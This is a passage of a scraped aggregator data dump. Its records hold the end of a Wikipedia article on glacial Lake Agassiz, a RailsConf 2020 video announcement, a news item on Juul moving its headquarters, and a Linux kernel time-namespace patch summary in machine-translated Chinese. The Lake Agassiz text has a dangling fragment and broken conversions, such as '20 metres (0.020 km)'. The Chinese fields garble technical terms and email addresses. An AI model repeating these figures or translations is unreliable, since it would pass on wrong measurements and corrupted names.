lake level ended the southern outlet through the ancestral Minnesota and Mississippi River system.  [1] The ice sheets advanced and blocked the northwestern outlet through the Clearwater and Athabasca system. There were several other low level outlets into the  Lake Minong basin, including the Kaministikwia and the Lake Nipigon outlet. These allowed large amounts of water to flow from Lake Agassiz into Lake Minong. A series of ice advances and retreats between 10,500 and 9,500 YBP blocked the Lake Nipigon outlet and the other low level outlets, creating intermittent catastrophic outbursts of water into the Lake Minong basin.  [1]\n These large inflows of water raised Lake Minong lake levels and flowed into Lake Algonquin in the Lake Michigan/Huron basin.  [1] These outbursts refilled the Lake Michigan and Huron basins, which are extreme low water levels of the  Lake Chippewa (Lake Michigan basin) and  Lake Stanley (Lake Huron basin). This was due to isostatic rebound of the northern shorelines combined with the opening of the  North Bay outlet of the Lake Huron basin.  [1] These repetitive outbursts from Lake Agassiz flooded the Lake Minong basin, then flowed over into the Lake Stanley basin, and then flowed through the North Bay drainage route into the  Champlain Sea (present day  St. Lawrence lowland).  [1] The shifting ice sheet created fluctuating drainage channels into the Lake Nipigon and Superior basin. A dozen beaches were created during short periods of stability. Towards the end of the Nipigon Phase, Lake Agassiz reached its largest geographical size as it joined with  Lake Ojibway in the east.  [1]\n   The Ojibway Phase is named for the glacial lake along the ice front in northern  Ontario.  Lake Ojibway merged with Lake Agassiz at this time. Isostatic rebound of glaciated lands that were south of the ice sheet created a long linear lake from the  Saskatchewan\u2013 Manitoba border to  Quebec. This long lake drained through the eastern outlet at  Kinojevis River \u00a0[ fr], into the  Ottawa River valley.  [1] Lake Agassiz-Ojibway drainage raised sea levels. The results can be seen in  Nova Scotia,  New Brunswick, and eastern  Maine. Marine records from the North Atlantic have identified two separate episodes, linked to northern hemisphere cooling in 8,490 YBP and 8,340\u20138,180 YBP. These may be linked with the Ojibway Phase of Lake Agassiz and may indicate large amounts of drainage from the Ottawa River valley and the  Tyrrell Sea (ancestral Hudson Bay).  [1]\n The Laurentide Ice Sheet continued to recede. Continued warming shrank the ice front towards present day Hudson Bay. Here, the Lake Agassiz northward outlet drained into the  Tyrrell Sea. This breach dropped the water level below the eastern Kinojevis outlet. The drainage was followed by the disintegration of the adjacent ice front at about 8,480 YBP. This brought on the end of Lake Agassiz. The ice sheet continued its northward retreat to  Baffin Island, leaving the North American mainland around 5,000 YBP.  [1]\n  Numerous lakes have formed in this glacial lake basin. The best known are the  Great Lakes of Manitoba;  Lake Winnipeg,  Lake Manitoba, and  Lake Winnipegosis. A cluster of smaller lakes surround these, including:  Cedar Lake, through which the  Saskatchewan River flows;  Lake Dauphin, south of Lake Winnipegosis and tributary to it; and  Lake St. Martin, on the Fairford or  Little Saskatchewan River, the outlet of Lakes Manitoba and Winnipegosis.  [19] In northern Minnesota, there are  Roseau,  Thief,  Mud, and  Maple lakes, besides three large lakes of that state,  Rainy Lake, the  Lake of the Woods, and  Red Lake.  [19]\n The southern area is 25 miles (40\u00a0km) wide. The northern area is 60 miles (97\u00a0km) wide.\n  85 miles to a strait 2 miles (3\u00a0km) to 4 miles (6\u00a0km) wide, which extends 12 miles (19\u00a0km) to Cape Dog. The narrowest is about 1 mile (1.6\u00a0km) wide with five-sixths of the lake north of the cape, and one-sixth south.\n  Glacial  Lake Souris formed along the  Manitoba and  North Dakota border, forming a crescent around the west side of the  Turtle Mountains. Lake Souris had three successive outlets: the Sheyenne River, the Pembina River, and finally the Assiniboine River.  [21]  [22] Initially, Lake Souris&#39; southern bay drained into the  Sheyenne River, a tributary of the Red River, which in turn flowed into Lake Agassiz.  [23] However, after the ice sheet had retreated enough to uncover Turtle Mountain, the northern bay of Lake Souris found an outlet at the &#34;elbow&#34; of the modern  Souris River; the elbow is about 18 miles (29\u00a0km) southwest of the present mouth of the Souris River.  [19] : 57 From this elbow, the lake&#39;s waters flowed southeast and entered the  Pembina River, now a tributary of the  Red River,  [19] : 57\u201358,268 and the Pembina, in turn, entered Lake Agassiz at its  Assiniboine embayment.  [24] When the ice sheet retreated north of the Assiniboine River, Lake Souris drained via that river into Lake Agassiz.  [25] ( Pelican Lake in Langs Valley of Manitoba occupies what was once the northern shore of Lake Souris.  [26])\n The lower part of the  Saskatchewan River basin near the river&#39;s mouth at Cedar Lake was clear of the ice-sheet before Lake Agassiz began to drain to northeast.  [19] Lake Saskatchewan existed on about 135 miles (217\u00a0km) of the  North Saskatchewan River between  Saskatoon and  Prince Albert,  Saskatchewan. A few miles east of Lake Saskatchewan&#39;s outlet, near the modern junction of the north and south branches, it entered Lake Agassiz. This Saskatchewan embayment extended for 400 miles (640\u00a0km) along the modern Saskatchewan River route.  [19]\n  Raised beaches, many kilometers from any water, mark the former boundaries of the lake. While the Red River gradually descends from south to north, these old  strandlines ascend as one goes north, due to  isostatic rebound since glaciation.  [6]\n  The highest shore of Lake Agassiz is called the  Herman Beach. It is named for  Herman, Minnesota, in  Grant County. The Herman Beach is the highest shoreline and can be traced from the historic outlet at  Lake Traverse on the border of Minnesota and South Dakota. The beach fluctuates between 973 feet (297\u00a0m) and 976 feet (297\u00a0m) above sea level. The altitude of Lake Traverse at 971 feet (296\u00a0m) above sea level at the  Traverse Gap at  Brown&#39;s Valley is at 980 feet (300\u00a0m).  [27] This was the south outlet of Lake Agassiz.  [28]\n The Herman Beach displays numerous deltas from the major rivers that entered Lake Agassiz. In Minnesota and North Dakota, these include the Buffalo River Delta, Sand Hill River Delta, Sheyenne River Delta, Elk Valley Delta, and the Pembina River Delta. In Manitoba, there is the Assiniboine River Delta.  [28]\n Beaches of the Norcross stages: The Norcross shoreline lies near the Herman shore on the slope of eroded till.  [27]\n Beaches of the Tintah stage: The Tintah beaches are 1,040 feet (320\u00a0m) to 1,055 feet (322\u00a0m) above sea level.  [27]\n Beaches of the Campbell stage: These have a well developed profile and are useful in establishing the boundary of the lake when it ceased to flow south into the River Warren.  [27]\n Beaches of the McCauleyville stage: The channel of the River Warren, flowing out of Lake Agassiz, eroded the channel below the level of Traverse Lake and  Big Stone Lake, down to 935 feet (285\u00a0m), the deepest part of Lake Traverse. The southern portions of the McCauleyville shoreline coincides with the levels of high and low water in Lake Traverse, which are approximately 976 feet (297\u00a0m) to 970 feet (300\u00a0m) above sea level.  [27]\n  Fourteen shorelines of Lake Agassiz have been identified, which lie below the McCauleyville beaches. These formed when the River Warren could no longer receive the outflow of the lake. This occurred when a lower outlet was found and the lake shrank with the release of the lakes waters.  [29] The three highest shorelines are named the Blanchard beaches, and the next five in descending order are the Hillsboro, the two Emerado, and the two Ojata beaches, from towns on or near their course in North Dakota.  [29]\n Beaches of the Blanchard Stage (Hillsboro Beach): Three successive levels of the lake pass near  Blanchard, North Dakota. They are indicated by sand and gravel deposits 5 miles (8.0\u00a0km) to 7 miles (11\u00a0km) southeast of  Euclid, Minnesota., and near  Midway station, Manitoba  [29] The next lower beach is called the Hillsboro beach and is visible near  Glyndon, Minnesota, and 5 miles (8.0\u00a0km) to 15 miles (24\u00a0km) north of  Crookston, Minnesota.  [29]\n Beaches of the Emerado Stage: The Emerado shoreline, is approximately 885 feet (270\u00a0m) above sea level. Its southern tip is across the Red River between  Kragnes, Minnesota, and  Harwood, North Dakota. This single shoreline, clearly shows that it belongs to a period when the lake flowed northeastward to its outlet. Crustal rebound was greater to the north, where the Emerado beach, in Manitoba is 10 feet (3.0\u00a0m) to 20 feet (6.1\u00a0m) higher.  [29]\n Beaches of the Ojata stage: The upper Ojata shoreline is between 870 feet (270\u00a0m) to 875 feet (267\u00a0m) above sea level near  Perley, Minnesota, and  Noble, North Dakota. In Minnesota it is 2 miles (3.2\u00a0km) to 6 miles (9.7\u00a0km) east of the Red River. Some of the shore is marked by a beach ridge, especially to the north, where the surface is till.  [29]\n Gladstone beach: The southern tip of Lake Agassiz when Gladstone beach formed is near  Belmont, North Dakota, 20 metres (0.020\u00a0km) south of  Grand Forks it lies 845 feet (258\u00a0m) above sea level. It runs northward about 10 miles (16\u00a0km) east of the Red River.  [29]\n Burnside beach: The Burnside beach crosses the Red River at  Grand Forks, North Dakota and to the northeast, then north, paralleling the Red River 10 metres (0.010\u00a0km) to 13 metres (0.013\u00a0km) to the east. This beach is indistinct south of the international border. The beach lies 835 feet (255\u00a0m) to 840 feet (260\u00a0m) above sea level.  [29]\n Ossowa beach: The Ossowa beach lies only a few miles south of the International boundary. The beach lies 815 feet (248\u00a0m) to 820 feet (250\u00a0m) above sea level.  [29]\n Stonewall beach: In  Stonewall, Manitoba there is a conspicuous beach ridge 0.33 miles (0.53\u00a0km) or more. Its crest is 820 feet (250\u00a0m) to 825 feet (251\u00a0m) above sea level and about 10 feet (3.0\u00a0m) deep. Beach deposits belonging to this stage were not observed elsewhere in southern Manitoba. It is believed that they are buried for most of their length from the U.S. side of the border, north to  Winnipeg  [29]\n Beaches of the Niverville stage: About 0.5 miles (0.8\u00a0km) southeast of  Niverville the road crosses this beach. Its crest is 777 feet (237\u00a0m) to 778 feet (237\u00a0m) above sea level. It stands 4 feet (1.2\u00a0m) above the surrounding surface. Beginning near Niverville station, it extends southeasterly at least a mile. About 0.33 miles (0.53\u00a0km) south, a similar beach ridge crest is at 780 feet (240\u00a0m) above sea level. It rises 2 feet (0.61\u00a0m) to 4 feet (1.2\u00a0m) above the land. Much of it  sloughs, with water throughout the year, the elevation of the beach crest is 782 feet (238\u00a0m) to 784 feet (239\u00a0m) above sea level.  [29]\n  The fertile soils of the  Red River Valley, now drained by the  Red River of the North, were formed from  lacustrine deposits of  silt from Lake Agassiz.  [6]  [30]\n     ^     a     b     c     d     e     f     g     h     i     j     k     l     m     n     o     p     q     r     s     t     u   Examining the progression and termination of Lake Agassiz; Michael J. Michalek; April 23, 2013\n ^     a     b     c   Perkins S (2002).  &#34;Once Upon a Lake&#34;.  Science News.  162 (18): 283\u2013284.  doi: 10.2307/4014064.  JSTOR\u00a0 4014064. Archived from  the original on 28 February 2009 .\n ^   Keating, William H. (1824).   Narrative of an Expedition to the Source of St. Peter&#39;s River, Lake Winnepeek, Lake of the Woods, \u2026. vol. 2. Philadelphia, Pennsylvania, U.S.A.: H.C. Cary &amp; I. Lea. p.\u00a07.   From p. 7: &#34;In some places pebbles were as abundant as if we had been travelling upon the bed of some former river or lake; the mind endeavours in vain to establish limits to the vast expanse of water which certainly at some former day overflowed the whole of that country.&#34;\n ^   Upham, Warren (1880).   The Geology of Central and Western Minnesota. A Preliminary Report. [From the General Report of Progress for the Year 1879.]. St. Paul, Minnesota, U.S.A.: The Pioneer Press Co. p.\u00a018.   From p. 18: &#34;Because of its relation to the retreating continental ice-sheet it is proposed to call this  Lake Agassiz, in memory of the first prominent advocate of the theory that the drift was produced by land-ice.&#34;\n ^  The &#34;retreat&#34; of glacial margins is not caused by a reversal of the glacier&#39;s flow, but rather from melting of the ice sheet.\n ^     a     b     c   Ojakangas RW, Matsch CL (1982).  Minnesota&#39;s Geology. Minnesota: University of Minnesota Press. pp.\u00a0106\u2013110.  ISBN\u00a0  978-0816609536.\n ^   Fisher, Timothy G.; Smith, Derald G.; Andrews, John T. (2002).  &#34;Preboreal oscillation caused by a \n......", "posttime": "2020-05-05 12:31:16", "tags": "\u963f\u52a0\u897f,lake,\u6d77\u6ee9", "title": "\u963f\u52a0\u897f\u6e56", "title_en": "Lake Agassiz", "transed": 1, "url": "https://en.wikipedia.org/wiki/Lake_Agassiz", "via": "", "source_name": "Hacker News", "source_domain": "news.ycombinator.com", "real_tags": ["\u963f\u52a0\u897f", "lake", "\u6d77\u6ee9"]}, {"category": "", "categoryclass": "", "imagename": "28b66f6c315af32dbb400eb656ea0fee.jpg", "infoid": 1000694, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u7531\u4e8e\u51a0\u72b6\u75c5\u6bd2\u7684\u4f20\u64ad\uff0c\u6211\u4eec\u4e0d\u5f97\u4e0d\u53d6\u6d88\u5728\u6ce2\u7279\u5170\u4e3e\u884c\u7684\u9762\u5bf9\u9762\u76842020\u5e74\u94c1\u8def\u5927\u4f1a\uff0c\u6211\u4eec\u90fd\u5f88\u96be\u8fc7(\u66f4\u591a\u4fe1\u606f\u89c1\u4e0b\u6587)\u3002\u6ca1\u6709\u4ec0\u4e48\u53ef\u4ee5\u5b8c\u5168\u66ff\u4ee3\u4f1a\u8bae\u4f53\u9a8c\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c\u6211\u4eec\u5f88\u9ad8\u5174\u5730\u5ba3\u5e03\uff0c\u6211\u4eec\u5df2\u7ecf\u8058\u8bf7\u4e86\u51e0\u4f4d\u539f\u521b\u7684\u94c1\u8def\u4f1a\u8bae2020\u6f14\u8bb2\u8005--\u5305\u62ec\u591a\u4f4d\u4e3b\u8bb2\u4eba--\u5f55\u5236\u4ed6\u4eec\u6f14\u8bb2\u7684\u89c6\u9891\u7248\u672c\u3002\n\u4e0b\u9762\u662f\u5b8c\u6574\u7684\u89c6\u9891\u5217\u8868\uff0c\u4f9b\u60a8\u5728\u8212\u9002\u7684\u6c99\u53d1\u4e0a\u60a0\u95f2\u5730\u6d4f\u89c8\u548c\u89c2\u770b\uff01\u89c6\u9891\u5c06\u5728\u94c1\u8def\u914d\u7f6e\u7f51\u7ad9\u4e0a\u64ad\u653e\u52302020\u5e74\u590f\u5929\uff0c\u4f46\u5f53\u4f60\u627e\u5230\u4f60\u60f3\u8981\u8fd4\u56de\u7684\u6700\u559c\u6b22\u7684\u89c6\u9891\u65f6\uff0c\u4e00\u5b9a\u8981\u7ed9\u7279\u5b9a\u7684\u89c6\u9891\u9875\u9762URL\u52a0\u4e66\u7b7e\uff0c\u56e0\u4e3a\u8fd9\u4e9bURL\u5c06\u65e0\u9650\u671f\u5730\u5b58\u5728\u3002\u5982\u679c\u60a8\u5bf9\u8fd9\u91cc\u6709\u4efb\u4f55\u95ee\u9898\uff0c\u60a8\u53ef\u4ee5\u968f\u65f6\u8054\u7cfb\u6211\u4eec\uff0c\u5730\u5740\u662fRailsConf@rubycenter al.org\uff1b\u5426\u5219\uff0c\u795d\u60a8\u89c2\u770b\u6109\u5feb\uff01\n\u5355\u51fb\u6b64\u5904\u4e86\u89e3\u6709\u5173\u6211\u4eec\u51b3\u5b9a\u53d6\u6d882020\u5e74\u94c1\u8def\u4f1a\u8bae\u7684\u66f4\u591a\u4fe1\u606f\u3002\n\u5927\u536b\u662fRuby on Rails\u7684\u521b\u59cb\u4eba\uff0cBasecamp(\u539f37Signals)\u7684\u521b\u59cb\u4eba\u517c\u9996\u5e2d\u6280\u672f\u5b98\uff0c\u7545\u9500\u4e66\u4f5c\u5bb6\uff0c\u52d2\u8292\u73ed\u7ea7\u83b7\u5956\u8d5b\u8f66\u624b\uff0c\u516c\u4f17\u6f14\u8bf4\u5bb6\uff0c\u4e1a\u4f59\u6444\u5f71\u5e08\u548c\u5c45\u5bb6\u7537\u4eba\u3002\n\u67e5\u770b\u6ce8\u91ca\u8bb0\u53f7\u3002\nEileen Uitelle\u662fGitHub Ruby\u67b6\u6784\u56e2\u961f\u7684\u4e00\u540d\u5458\u5de5\u8f6f\u4ef6\u5de5\u7a0b\u5e08\uff0c\u4e5f\u662fRails\u6838\u5fc3\u56e2\u961f\u7684\u6210\u5458\u3002\u5979\u662f\u5f00\u653e\u6e90\u7801\u7684\u70ed\u5fc3\u8d21\u732e\u8005\uff0c\u4e13\u6ce8\u4e8eRuby on rails\u6846\u67b6\u53ca\u5176\u4f9d\u8d56\u9879\u3002Eileen\u70ed\u8877\u4e8e\u53ef\u4f38\u7f29\u6027\u3001\u6027\u80fd\uff0c\u5e76\u4f7f\u5f00\u653e\u6e90\u7801\u793e\u533a\u66f4\u53ef\u6301\u7eed\u548c\u66f4\u53d7\u6b22\u8fce\u3002\n\u67e5\u770b\u6ce8\u91ca\u8bb0\u53f7\u3002\nAaron\u5728Ruby\u6838\u5fc3\u56e2\u961f\u3001Rails\u6838\u5fc3\u56e2\u961f\u4ee5\u53ca\u7167\u987e\u4ed6\u7684\u732bGorby Puff\u7684\u56e2\u961f\u4e2d\u3002\u767d\u5929\u4ed6\u5728\u4e00\u5bb6\u5c0f\u79d1\u6280\u516c\u53f8\u5de5\u4f5c\u3002\n\u67e5\u770b\u6ce8\u91ca\u8bb0\u53f7", "note_en": "We were all quite saddened to have to cancel our in-person RailsConf 2020 in Portland due to the spread of COVID-19 (more info below). Nothing can fully substitute for the conference experience. That said, we&#39;re delighted to announce that we&#39;ve engaged several original RailsConf 2020 speakers -- including multiple keynoters -- to record video versions of their talks.\n  That full slate of videos is below for you to browse and watch at your leisure, from the comfort of your couch! Videos will be featured at  railsconf.com through Summer 2020, but as you find your favorites that you want to return to, be sure to bookmark the specific video page URLs, as those will be live indefinitely. If you have questions on anything here, you can always reach us at  railsconf@rubycentral.org; otherwise, happy viewing!\n    Click here for more info on our decision to cancel RailsConf 2020.\n  David is the creator of Ruby on Rails, founder &amp; CTO at Basecamp (formerly 37signals), best-selling author, Le Mans class-winning racing driver, public speaker, hobbyist photographer, and family man.\n  View Keynote\n  Eileen Uchitelle is a Staff Software Engineer on the Ruby Architecture Team at GitHub and a member of the Rails Core team. She&#39;s an avid contributor to open source focusing on the Ruby on Rails framework and its dependencies. Eileen is passionate about scalability, performance, and making open source communities more sustainable and welcoming.\n  View Keynote\n  Aaron is on the Ruby core team, the Rails core team, and the team that takes care of his cat, Gorby puff. During the day he works for a small technology company.\n    View Keynote", "posttime": "2020-05-05 12:02:20", "tags": "2020,\u94c1\u8def,couch,\u89c6\u9891,ruby", "title": "\u94c1\u8def\u4f1a\u8bae2020\u6c99\u53d1\u7248", "title_en": "RailsConf 2020 Couch Edition", "transed": 1, "url": "https://railsconf.com/", "via": "", "source_name": "Hacker News", "source_domain": "news.ycombinator.com", "real_tags": ["2020", "\u94c1\u8def", "couch", "\u89c6\u9891", "ruby"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1000693, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "JUUL\u5b9e\u9a8c\u5ba4\u516c\u53f8\u3002\u636e\u77e5\u60c5\u4eba\u58eb\u900f\u9732\uff0c\u8be5\u7535\u5b50\u70df\u5236\u9020\u5546\u6b63\u5728\u5c06\u603b\u90e8\u4ece\u65e7\u91d1\u5c71\u8fc1\u81f3\u534e\u76db\u987f\u7279\u533a\uff0c\u8be5\u516c\u53f8\u6b63\u5bfb\u6c42\u4fee\u590d\u4e0e\u76d1\u7ba1\u673a\u6784\u7684\u5173\u7cfb\uff0c\u5e76\u4e0e\u7845\u8c37\u4e0d\u60dc\u4e00\u5207\u4ee3\u4ef7\u5b9e\u73b0\u589e\u957f\u7684\u6587\u5316\u4fdd\u6301\u8ddd\u79bb\u3002\n\u77e5\u60c5\u4eba\u58eb\u8bf4\uff0c\u6b64\u4e3e\u662f\u4e00\u9879\u66f4\u5e7f\u6cdb\u7684\u91cd\u7ec4\u8ba1\u5212\u7684\u4e00\u90e8\u5206\uff0c\u8be5\u8ba1\u5212\u5305\u62ec\u88c1\u5458\u7ea6\u4e09\u5206\u4e4b\u4e00\uff0c\u5173\u95ed\u4e00\u4e9b\u7f8e\u56fd\u529e\u4e8b\u5904\uff0c\u5e76\u7f29\u51cf\u5176\u5728\u6b27\u6d32\u548c\u4e9a\u6d32\u7684\u8db3\u8ff9\u3002\n..\u3002", "note_en": "Juul Labs Inc. is moving its headquarters from San Francisco to Washington, D.C., as the e-cigarette maker seeks to repair its relationship with regulators and distance itself from Silicon Valley\u2019s growth-at-all-costs culture, according to people familiar with the matter.\n  The move is part of a broader restructuring plan that includes a reduction in the company\u2019s workforce by roughly a third, the closure of some U.S. offices and a scaling back of its footprint in Europe and Asia, the people said.\n...", "posttime": "2020-05-05 12:02:10", "tags": "\u65e7\u91d1\u5c71,\u57fa\u5730,moving,\u4eba\u58eb,people", "title": "JUUL\u5c06\u628a\u57fa\u5730\u4ece\u65e7\u91d1\u5c71\u642c\u5230\u534e\u76db\u987f\u7279\u533a", "title_en": "Juul Is Moving Base from San Francisco to Washington, D.C", "transed": 1, "url": "https://www.wsj.com/articles/e-cigarette-maker-juul-is-leaving-san-francisco-for-washington-d-c-11588640401", "via": "", "source_name": "Hacker News", "source_domain": "news.ycombinator.com", "real_tags": ["\u65e7\u91d1\u5c71", "\u57fa\u5730", "moving", "\u4eba\u58eb", "people"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1000692, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "/color/Atom\u63d0\u8981\u53d1\u4ef6\u4eba\uff1aDmitry Safonov&lt\uff1bDima@arista.com&gt\uff1b\u6536\u4ef6\u4eba\uff1alinux-kernel@vger.kernel.orgCc\uff1admitry Safonov&lt\uff1b0x7f454c46@gmail.com&gt\uff1b\uff0cDmitry Safonov&lt\uff1bDima@arista.com&&gt;\uff0cAdrian Reber&lt\uff1badrian@lisas.de&gt\uff1b\uff0cAndrei Vt\uff1bchristian.brauner@ubuntu.com&&gt;\uff0cCyrill Gorcunov&lt\uff1bgorcunov@openvz.org&&gt;\uff0c&#34\uff1bEric W.Biederman&#34\uff1b&lt\uff1bebiederm@xmission.com&&gt;\uff0c&#34\uff1bH.Peter Anvin&34\uff1b&lt\uff1bhpa@zytor.com&&gt;\uff0cIngo Molnar&lt\uff1bMingo@redhat.com&\u3002\u8054\u7cfb\u4eba\uff1aPavel Emelyanov&lt\uff1bxemul@Virtuozzo.com&gt\uff1b\uff0cShuah Khan&lt\uff1bShuah@kernel.org&gt\uff1b\uff0cThomas Gleixner&lt\uff1btglx@linuconix.de&gt\uff1b\uff0cVincenzo Frascino&lt\uff1bvincenzo.frascino@arm.com&gt\uff1b\uff0cContainers@lists.linux-Foundation ation.org\uff0ccriu@openvz.org\uff0c20191112012724.250792-1-DIMA@arista.com&&gt;(RAW)\u5173\u4e8e\u65f6\u95f4\u547d\u540d\u7a7a\u95f4\u7684\u8ba8\u8bba\u7531\u6765\u5df2\u4e45\u3002\u6770\u592b\u00b7\u6234\u514b(Jeff Dike)\u57282006\u5e74\u9996\u6b21\u5c1d\u8bd5\u5b9e\u65bd\u8fd9\u4e00\u8ba1\u5212\u3002\u4ece\u90a3\u65f6\u8d77\uff0c\u8fd9\u4e2a\u4e3b\u9898\u5c31\u65ad\u65ad\u7eed\u7eed\u5730\u51fa\u73b0\u5728\u5404\u79cd\u8ba8\u8bba\u4e2d\u3002\u65f6\u95f4\u547d\u540d\u7a7a\u95f4\u6709\u4e24\u4e2a\u4e3b\u8981\u7528\u4f8b\uff1a1.\u66f4\u6539\u5bb9\u5668\u5185\u7684\u65e5\u671f\u548c\u65f6\u95f4\uff1b2.\u8c03\u6574\u4ece\u68c0\u67e5\u70b9\u6062\u590d\u7684\u5bb9\u5668\u7684\u65f6\u949f\u3002\u201c\u8fd9\u4f3c\u4e4e\u662f\u963b\u6b62\u8fc1\u79fb\u5728\u751f\u4ea7\u7cfb\u7edf\u4e2d\u4f7f\u7528\u7684\u6700\u540e\u4e3b\u8981\u969c\u788d\u4e4b\u4e00\uff0c\u56e0\u4e3a\u4e0d\u662f\u6240\u6709\u7684\u5bb9\u5668\u548c\u8fde\u63a5\u90fd\u53ef\u4ee5\u8fc1\u79fb\uff0c\u53ea\u8981\u65f6\u95f4\u4f9d\u8d56\u5173\u7cfb\u80fd\u591f\u5c06\u5176\u641e\u5f97\u4e00\u56e2\u7cdf\u3002\u201d(\u4f5c\u8005\uff1agithub.com/dav-ell)\u5185\u6838\u63d0\u4f9b\u5bf9\u51e0\u4e2a\u65f6\u949f\u7684\u8bbf\u95ee\uff1aCLOCK_REALTIME\u3001CLOCK_MONTOTONIC\u3001CLOCK_BOOTTIME\u3002\u6700\u540e\u4e24\u4e2a\u65f6\u949f\u662f\u5355\u8c03\u7684\uff0c\u4f46\u5b83\u4eec\u7684\u8d77\u59cb\u70b9\u6ca1\u6709\u5b9a\u4e49\uff0c\u5e76\u4e14\u6bcf\u4e2a\u7cfb\u7edf\u7684\u8d77\u59cb\u70b9\u90fd\u4e0d\u540c\u3002\u5f53\u5bb9\u5668\u4ece\u4e00\u4e2a\u8282\u70b9\u8fc1\u79fb\u5230\u53e6\u4e00\u4e2a\u8282\u70b9\u65f6\uff0c\u6240\u6709\u65f6\u949f\u90fd\u5fc5\u987b\u6062\u590d\u5230\u4e00\u81f4\u7684\u72b6\u6001\uff1b\u6362\u53e5\u8bdd\u8bf4\uff0c\u5b83\u4eec\u5fc5\u987b\u4ece\u5b83\u4eec\u88ab\u8f6c\u50a8\u7684\u76f8\u540c\u70b9\u7ee7\u7eed\u8fd0\u884c\u3002\u8fd9\u4e2a\u8865\u4e01\u96c6\u7684\u4e3b\u8981\u601d\u60f3\u662f\u4e3a\u7cfb\u7edf\u65f6\u949f\u6dfb\u52a0\u6bcf\u4e2a\u547d\u540d\u7a7a\u95f4\u7684\u504f\u79fb\u91cf\u3002\u5f53\u975e\u6839\u65f6\u95f4\u547d\u540d\u7a7a\u95f4\u4e2d\u7684\u8fdb\u7a0b\u8bf7\u6c42\u65f6\u949f\u7684\u65f6\u95f4\u65f6\uff0c\u547d\u540d\u7a7a\u95f4\u504f\u79fb\u91cf\u5c06\u6dfb\u52a0\u5230\u6b64\u65f6\u949f\u7684\u5f53\u524d\u503c\u4e0a\uff0c\u5e76\u8fd4\u56de\u603b\u548c\u3002\u6240\u6709\u504f\u79fb\u91cf\u90fd\u653e\u5728\u5355\u72ec\u7684\u9875\u9762\u4e0a\uff0c\u8fd9\u5141\u8bb8\u6211\u4eec\u5c06\u5176\u4f5c\u4e3aVVAR\u7684\u4e00\u90e8\u5206\u6620\u5c04\u5230\u7528\u6237\u8fdb\u7a0b\u4e2d\uff0c\u5e76\u4f7f\u7528\u6765\u81eaVDSO\u8c03\u7528\u7684\u504f\u79fb\u91cf\u3002\u73b0\u5728\u4e3aCLOCK_MONTOTONIC\u548cCLOCK_BOOTIMEclocks.v7..V8\u66f4\u6539\u5b9e\u73b0\u4e86\u504f\u79fb\u91cf\uff1a*\u4fee\u590d\u7f16\u8bd1\u65f6\u9519\u8bef\uff1a-\u5728\u6ca1\u6709\u652f\u6301\u7684\u4f53\u7cfb\u7ed3\u6784\u4e0a\u3002-\u672a\u8bbe\u7f6eCONFIG_POSIX_TIMERS\u65f6\u3002*\u6dfb\u52a0\u4e86CONFIG_POSIX_TIMERS\u81ea\u68c0\u4e2d\u7684\u68c0\u67e5\u3002*\u5185\u8054DO_HRES\u548cDO_CORARY\u3002(\u5e76\u6dfb\u52a0\u4e86\u6d4b\u8bd5-\u7531Vincenzo\u63d0\u4f9b-\u8c22\u8c22\uff01)*\u4f7ftime_ns\u4f9d\u8d56\u4e8eGENERIC_VDSO_TIME_NS\u5e76\u6309Arch\u8fdb\u884c\u8bbe\u7f6e\u3002[V1..v7 Changellogs\u4f4d\u4e8e\u6b64\u5904\u7684\u6700\u5e95\u90e8]\u6211\u4eec\u7684\u6027\u80fd\u6d4b\u91cf\u663e\u793a\uff0c\u5b50\u65f6\u95f4\u547d\u540d\u7a7a\u95f4\u4e2dVDSO\u7684lock_gettime()\u7684\u4ef7\u683c\u5728\u70edCPU\u7f13\u5b58\u4e0b\u7ea6\u4e3a8%\uff0c\u5728\u51b7CPU\u7f13\u5b58\u4e0b\u7ea6\u4e3a90%\u3002\u5728\u8fd9\u4e9b\u6d4b\u8bd5\u4e2d\uff0c\u65f6\u95f4\u547d\u540d\u7a7a\u95f4\u4e4b\u5916\u7684\u4e3b\u673a\u8fdb\u7a0b\u6ca1\u6709\u6027\u80fd\u56de\u5f52\u3002\u6211\u4eec\u7f16\u5199\u4e86\u4e24\u4e2a\u5c0f\u57fa\u51c6\u6d4b\u8bd5\u3002\u7b2c\u4e00\u4e2agettimePerform.c\u5728\u5faa\u73af\u4e2d\u8c03\u7528sclock_gettime()3\u79d2\u3002\u5b83\u5411\u6211\u4eec\u5c55\u793a\u4e86\u70edCPU\u7f13\u5b58\u7684\u6027\u80fd(lock_gettime()\u5468\u671f\u8d8a\u591a-\u8d8a\u597d)\uff1a\u7b2c\u4e00\u4e2a\u8868\u663e\u793a\u4e86\u6839\u65f6\u95f4\u540d\u7a7a\u95f4\u4e2dlock_gettime()\u7684\u6027\u80fd\u3002|TIMENS=y-|150363883|167076184|164979177|150616056|167348942|165202727|150679279|167235485|165230267|150622312|167078735|165284077|150706992|167301837|165372663|150563707|167207900|165395728\u3002-AVG|150592038|167208180|165244106diff%|100|111|109.7-stdev%|0.08|0.07|0.1\u7981\u7528CONFIG_TIME_NS\u540e\uff0c\u6027\u80fd\u63d0\u534711%.\u3002\u8fd9\u662f\u901a\u8fc7\u5c06\u4e0d\u592a\u53ef\u80fd\u7684\u63d0\u793a\u6dfb\u52a0\u5230vdso_read_egin()\u4e2d\u5e76\u5185\u8054do_hres()\u548cdo_coough()\u6765\u5b9e\u73b0\u7684\u3002\u542f\u7528config_time_NS\u65f6\uff0c__vdso_lock_gettime\u51fd\u6570\u4e2d\u4f1a\u591a\u4e00\u4e2a\u635f\u574f\u7684\u5bc4\u5b58\u5668\u3002\u8fd9\u4e00\u4e8b\u5b9e\u89e3\u91ca\u4e86\u4e24\u4e2a\u53f3\u4fa7\u5217\u4e4b\u95f4\u7684\u6027\u80fd\u5dee\u5f02\u3002\u7b2c\u4e8c\u4e2a\u8868\u663e\u793a\u4e86lock_gettime\u5728\u975eroottime\u540d\u79f0\u7a7a\u95f4\u4e2d\u7684\u6027\u80fd\u3002|\u4e3b\u673a\u524d|timens-\u5185\u90e8|150363883|164979177|138133479|150616056|165202727|139047394|150679279|165230267|139284611|150622312|165284077|139263753|150706992|165372663|139175419|150563707|165395728|139334291\u3002-avg|150592038|165244106|